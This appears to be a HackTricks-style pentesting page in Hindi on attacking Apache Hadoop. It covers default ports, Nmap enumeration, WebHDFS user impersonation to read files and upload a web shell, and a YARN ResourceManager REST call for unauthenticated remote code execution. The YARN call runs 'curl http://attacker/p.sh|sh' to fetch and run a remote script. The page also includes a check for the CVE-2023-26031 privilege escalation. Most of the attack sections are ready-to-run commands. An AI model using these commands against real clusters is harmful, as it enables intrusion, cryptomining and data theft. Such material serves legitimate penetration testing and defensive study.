# 50030-50060-50070-50075-50090 - Pentesting Hadoop

{{#include ../banners/hacktricks-training.md}}

## **मूल जानकारी**

**Apache Hadoop** एक **open-source framework** है जो कंप्यूटर क्लस्टर्स में बड़े datasets के **distributed storage और processing** के लिए प्रयोग होता है। यह storage के लिए **HDFS** और processing के लिए **MapReduce** का उपयोग करता है।

उपयोगी डिफ़ॉल्ट पोर्ट:

- **50070 / 9870** NameNode (WebHDFS)
- **50075 / 9864** DataNode
- **50090** Secondary NameNode
- **8088** YARN ResourceManager web UI & REST
- **8042** YARN NodeManager
- **8031/8032** YARN RPC (अक्सर भुला दिया जाता है और कई इंस्टॉलेशन्स में अभी भी unauth)

दुर्भाग्यवश दस्तावेज़ीकरण के समय Hadoop में Metasploit framework के लिए सपोर्ट मौजूद नहीं है। हालांकि, आप Hadoop सेवाओं को एन्यूमरेट करने के लिए निम्नलिखित **Nmap scripts** का उपयोग कर सकते हैं:

- **`hadoop-jobtracker-info (Port 50030)`**
- **`hadoop-tasktracker-info (Port 50060)`**
- **`hadoop-namenode-info (Port 50070)`**
- **`hadoop-datanode-info (Port 50075)`**
- **`hadoop-secondary-namenode-info (Port 50090)`**

यह ध्यान रखना महत्वपूर्ण है कि Hadoop अपनी डिफ़ॉल्ट सेटअप में बिना authentication के चलता है। हालांकि, बेहतर सुरक्षा के लिए Kerberos को **HDFS**, **YARN**, और **MapReduce** सेवाओं के साथ इंटीग्रेट करने के लिए configurations उपलब्ध हैं।

## WebHDFS / HttpFS दुरुपयोग (50070/9870 or 14000)

जब **security=off** होता है आप `user.name` parameter के साथ किसी भी user के रूप में impersonate कर सकते हैं। कुछ त्वरित primitives:
```bash
# list root directory
curl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"

# read arbitrary file from HDFS
curl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"

# upload a web shell / binary
curl -X PUT -T ./payload "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs" -H 'Content-Type: application/octet-stream'
```
यदि HttpFS सक्षम है (default port **14000**) तो वही REST paths लागू होते हैं। Kerberos के पीछे भी आप मान्य टिकट के साथ `curl --negotiate -u :` का उपयोग कर सकते हैं।

## YARN unauth RCE (8088)

The **ResourceManager REST API** डिफ़ॉल्ट “simple” मोड (`dr.who`) में बिना किसी auth के job submissions स्वीकार करती है। Attackers इसका दुरुपयोग arbitrary commands (e.g. miners) चलाने के लिए करते हैं, और उन्हें HDFS write access की आवश्यकता नहीं होती।
```bash
# 1) get an application id
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application

# 2) submit DistributedShell pointing to a command
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps \
-H 'Content-Type: application/json' \
-d '{
"application-id":"application_1234567890000_0001",
"application-name":"pwn",
"am-container-spec":{
"commands":{"command":"/bin/bash -c \"curl http://attacker/p.sh|sh\""}
},
"application-type":"YARN"
}'
```
If port **8031/8032 RPC** is exposed, older clusters allow the same job submission over protobuf without auth (documented in several cryptominer campaigns) – treat those ports as RCE as well.

## YARN containers से Local PrivEsc (CVE-2023-26031)

Hadoop 3.3.1–3.3.4 **container-executor** loads libs from a **relative RUNPATH**. जो उपयोगकर्ता YARN containers चला सकता है (insecure clusters पर remote submitters सहित) writable path में एक malicious `libcrypto.so` छोड़ सकता है और जब `container-executor` SUID के साथ चलता है तो **root** प्राप्त कर सकता है।

त्वरित जाँच:
```bash
readelf -d /opt/hadoop/bin/container-executor | grep 'RUNPATH\|RPATH'
# vulnerable if it contains $ORIGIN/:../lib/native/
ls -l /opt/hadoop/bin/container-executor   # SUID+root makes it exploitable
```
समाधान **3.3.5** में किया गया है; यदि secure containers की आवश्यकता नहीं है तो सुनिश्चित करें कि बाइनरी SUID न हो।

## संदर्भ

- [Apache Hadoop official CVE list](https://hadoop.apache.org/cve_list.html)
- [Wiz write-up on CVE-2023-26031](https://www.wiz.io/vulnerability-database/cve/cve-2023-26031)

{{#include ../banners/hacktricks-training.md}}
